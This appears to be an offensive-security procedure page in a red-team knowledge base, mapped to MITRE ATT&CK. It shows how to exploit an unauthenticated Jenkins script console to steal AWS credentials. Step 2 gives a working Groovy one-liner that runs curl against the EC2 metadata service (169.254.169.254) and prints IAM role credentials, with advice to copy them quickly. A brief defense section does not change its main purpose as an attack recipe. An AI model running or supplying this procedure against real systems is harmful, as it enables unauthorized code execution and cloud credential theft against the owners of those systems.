---
id: proc-jenkins-exfil-aws-001
tags:
  - rce
  - jenkins
  - aws
  - exfiltration
  - groovy
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/groovy-curl-aws-metadata]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Cloud Instance Metadata API]]'
updated_at: '2025-12-14T17:24:08.302Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Cloud Instance Metadata API]]'
---
# Access-Jenkins-Console-and-Exfiltrate-AWS-Credentials

## Summary

This procedure exploits an exposed, unauthenticated Jenkins script console to execute a Groovy script that runs a curl command, fetching temporary AWS IAM credentials from the EC2 instance metadata service for exfiltration.

## Description

In scenarios where Jenkins is misconfigured with an accessible script console at /jenkins/script without authentication, attackers can inject Groovy code to perform arbitrary system commands. Here, the procedure targets AWS environments by curling the metadata endpoint (169.254.169.254) to retrieve role credentials, which can then be used for AWS API access. Prerequisites include public exposure of the Jenkins instance on an AWS EC2 host with an attached IAM role. Successful execution discloses sensitive credentials, enabling further attacks like resource enumeration or modification.

## Requirements

1. Direct HTTPS access to the target Jenkins URL (e.g., https://target.com/jenkins/script)
2. Target running on AWS EC2 with IAM role (e.g., AmazonSSMRoleForInstancesQuickSetup)
3. Web browser or tool to interact with the script console

## Defense

Defensive measures and detection strategies:

- Disable or protect the Jenkins script console with authentication (e.g., enable security matrix)
- Use AWS IAM policies to restrict metadata access or employ IMDSv2
- Monitor Jenkins logs for unauthorized Groovy executions and network traffic to 169.254.169.254

## Objectives

1. Achieve unauthenticated RCE on the Jenkins host
2. Exfiltrate AWS IAM credentials for privilege escalation in the cloud
3. Validate credentials for subsequent AWS operations

## Instructions

### Step 1: Access the Jenkins Script Console

**Context**: Navigate to the exposed endpoint to load the unauthenticated console interface.

No command required; use a browser to visit https://target.com/jenkins/script and confirm the console is accessible without login.

> If prompted for credentials, the vulnerability is not present; abort.

### Step 2: Execute Groovy Script to Fetch Credentials

**Context**: Inject and run a Groovy one-liner to execute curl against the AWS metadata service and print the results.

**Command** ([[commands/groovy-curl-aws-metadata]]):
```groovy
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text
```

> This Groovy code uses the .execute() method to run the shell curl command, targeting the specific IAM role. Expected output is a JSON with credentials; copy them immediately as they are temporary (typically 1-6 hours valid).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Cloud Instance Metadata API]] Cloud Instance Metadata Abuse

### Sub-Techniques


## Commands Used

- [[commands/groovy-curl-aws-metadata]]

## Tools Used


## Tags

- rce
- jenkins
- aws
- exfiltration
